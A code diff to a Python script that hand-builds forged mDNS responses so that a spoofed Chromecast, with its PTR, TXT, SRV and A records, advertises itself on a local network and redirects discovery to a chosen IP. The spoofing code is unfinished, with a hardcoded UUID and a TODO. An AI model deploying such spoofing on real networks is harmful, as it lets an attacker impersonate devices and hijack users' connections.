@@ -35,9 +35,9 @@ def get_info(ip):
 
 def spoof_response():
     conf.L3socket=L3RawSocket
-    ans = '00 00 84 00 00 00 00 01 00 00 00 03 0b 5f 67 6f 6f 67 6c 65 63 61 73 74 04 5f 74 63 70 05 6c 6f 63 61 6c 00 00 0c 00 01 00 00 00 78 00 2e 2b 43 68 72 6f 6d 65 63 61 73 74 2d 62 33 66 64 66 31 61 66 34 35 63 62 31 64 32 30 63 39 37 35 31 33 34 32 30 37 37 36 36 31 65 38 c0 0c'
 
-
+    #prepping needed unformation from the ip provided by the user
+    #get friendly name and uuid from the xml and makes the ip into hex for the query
     uuid_fn = get_info(redirect_to)
     uuid = uuid_fn[0]
     fn = uuid_fn[1]
@@ -46,20 +46,28 @@ def spoof_response():
     hex_ip = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, a))
     uuid_nodash = ''.join(uuid.split('-'))
 
+    #mdns response top with the chromecast name in there (Chromecast-<uid no dashes>._googlecast._tcp.local
+    #may need to dynamically set the length but I am assuming all uuids are the same length
+    #TODO put uid in dynamically
+    ans = '00 00 84 00 00 00 00 01 00 00 00 03 0b 5f 67 6f 6f 67 6c 65 63 61 73 74 04 5f 74 63 70'
+    dot_local_loc = 'c' + hex(len(''.join(ans.split()))/2)[2:].zfill(3)
+    ans += '05 6c 6f 63 61 6c 00 00 0c 00 01 00 00 00 78 00 2e'
+    ans += '2b 43 68 72 6f 6d 65 63 61 73 74 2d' #Chromecast- prepend
+    #ans += binascii.hexlify(uuid_nodash) #uuid
+    ans += '62 33 66 64 66 31 61 66 34 35 63 62 31 64 32 30 63 39 37 35 31 33 34 32 30 37 37 36 36 31 65 38' #uuid
+    ans += 'c0 0c' #offset to .local
+
+    data_length = 6 + 3 + len(uuid_nodash) + 3  + fn_len + 3 + 5 + 13 + 18 #num of lengths + weird field len + lengths + ve field len + len chromecast + len icon + 2 threes for xx=
 
     #TXT record
     ansextratxt =  'c0 2e 00 10 80 01 00 00' #intro to text record
     ansextratxt += '11 94' #Time to Live for dns caching
-    #ansextratxt += '00 9b' #data length
-    data_length = 6 + 3 + len(uuid_nodash) + 3  + fn_len + 3 + 5 + 13 + 18 #num of lengths + weird field len + lengths + ve field len + len chromecast + len icon + 2 threes for xx=
     ansextratxt += hex(data_length)[2:].zfill(4) #data length
     ansextratxt += '23' #length of next txt section (ID)
     ansextratxt += '69 64 3d' #ASCII id= as hex
     ansextratxt += binascii.hexlify(uuid_nodash) #the id
     ansextratxt += '03' #3 len of this weird field rs=
     ansextratxt += '72 73 3d' #weird field rs=
-
-    #ansextratxt += '1a' #length of the next txt section (FN)
     ansextratxt += hex(fn_len + 3)[2:].zfill(2) #length of the next txt section (FN)
     ansextratxt += '66 6e 3d' #ASCII fn= as hex
     ansextratxt += fn #friendly name as hex
@@ -69,6 +77,7 @@ def spoof_response():
     ansextratxt += '6d 64 3d 43 68 72 6f 6d 65 63 61 73 74' #md=Chromecast
     ansextratxt += '12' #18 length of icon
     ansextratxt += '69 63 3d 2f 73 65 74 75 70 2f 69 63 6f 6e 2e 70 6e 67' #ic=/setup/icon.png
+
     #ansextratxt += '13' #19 len of rm
     #ansextratxt += '72 6d 3d 43 45 32 33 46 44 38 39 44 36 41 38 41 37 31 33' #rm=CE23FD89D6A8A713
     #ansextratxt += '07' #7 len of ca
@@ -81,7 +90,10 @@ def spoof_response():
     #SRV record
     ansextrasrv =  'c0 2e 00 21 80 01 00 00 00 78 00 2d 00 00 00 00 1f 49' #srv record stuff
     dom_loc = 'c' + hex((len(''.join(ans.split())) + len(''.join(ansextratxt.split())) + len(''.join(ansextrasrv.split())))/2)[2:].zfill(3)
-    ansextrasrv += '24 62 33 66 64 66 31 61 66 2d 34 35 63 62 2d 31 64 32 30 2d 63 39 37 35 2d 31 33 34 32 30 37 37 36 36 31 65 38 c0 1d' #the last domain
+    ansextrasrv += '24' #$ to be the start
+    ansextrasrv += binascii.hexlify(uuid) #uid with dashes
+    ansextrasrv += dot_local_loc #<uuid with dashes><.local location> --- the last domain
+
 
     #A record
     ansextraa   =  dom_loc #offset of the last domain (<uid with dashes>.local)
